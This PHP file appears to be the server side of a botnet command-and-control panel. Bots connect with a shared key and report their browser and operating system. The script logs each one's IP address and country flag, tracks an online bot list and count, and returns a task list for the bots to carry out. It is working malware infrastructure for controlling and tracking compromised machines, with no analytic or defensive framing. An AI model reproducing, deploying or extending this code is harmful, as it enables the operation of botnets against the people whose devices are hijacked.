<?php

require("./config.php");

if(isset($_GET['connect']) && $_GET['connect'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname'])) {
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, "[" . $date . "] [<img src='" . $flagsdir . "/" . $countrycode . ".gif'/>] [" . $browserType . "] [" . $OSName . "] " . htmlspecialchars($_SERVER['REMOTE_ADDR'], ENT_QUOTES) . " connected.\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
    
    $fp = fopen($onlinebotlist, "a") or die("Unable to open file!");
    $botlist = explode("\r\n", file_get_contents($onlinebotlist));
    $botexists = false;
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if(strpos($bot, $_SERVER['REMOTE_ADDR']) != false && strpos($bot, $browserType) != false && strpos($bot, $OSName) != false) {
            $botexists = true;
            //bot is already online. do nothing.
        }
    }
    if(!$botexists) { //bot is not online. add it to the online list
        fwrite($fp, $date . "|" . $countrycode . "|" . $browserType . "|" . $OSName . "|" . $_SERVER['REMOTE_ADDR'] . "\r\n") or die("Unable to write to file!");
        file_put_contents($onlinefile, intval(file_get_contents($onlinefile))+1);
    }
    fflush($fp);
    fclose($fp);
} else if(isset($_GET['disconnect']) && $_GET['disconnect'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname'])) {
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, "[" . $date . "] [<img src='" . $flagsdir . "/" . $countrycode . ".gif'/>] [" . $browserType . "] [" . $OSName . "] " . htmlspecialchars($_SERVER['REMOTE_ADDR'], ENT_QUOTES) . " disconnected.\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
    
    $botlist = explode("\r\n", file_get_contents($onlinebotlist));
    $loc = 0;
    
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if(strpos($bot, $_SERVER['REMOTE_ADDR']) != false && strpos($bot, $browserType) != false && strpos($bot, $OSName) != false) {
            array_splice($botlist, $loc, 1);
            $online = intval(file_get_contents($onlinefile));
            if($online > 0){
                file_put_contents($onlinefile, $online-1);
            } else if($online < 0) {
                file_put_contents($onlinefile, "0");
            }
        }
        $loc++;
    }
    $fp = fopen($onlinebotlist, "w") or die("Unable to open file!");
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if($bot != "") {
            fwrite($fp, $bot . "\r\n") or die("Unable to write to file!");
        }
    }
    fflush($fp);
    fclose($fp);
} else if(isset($_GET['gettasks']) && $_GET['gettasks'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname'])) {
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($onlinebotlist, "a") or die("Unable to open file!");
    $botlist = explode("\r\n", file_get_contents($onlinebotlist));
    $botexists = false;
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if(strpos($bot, $_SERVER['REMOTE_ADDR']) != false && strpos($bot, $browserType) != false && strpos($bot, $OSName) != false) {
            $botexists = true;
            //bot is already online. do nothing.
        }
    }
    if(!$botexists) { //bot is not online. add it to the online list
        fwrite($fp, $date . "|" . $countrycode . "|" . $browserType . "|" . $OSName . "|" . $_SERVER['REMOTE_ADDR'] . "\r\n") or die("Unable to write to file!");
        file_put_contents($onlinefile, intval(file_get_contents($onlinefile))+1);
    }
    fflush($fp);
    fclose($fp);
    echo file_get_contents($tasklist);
}
?>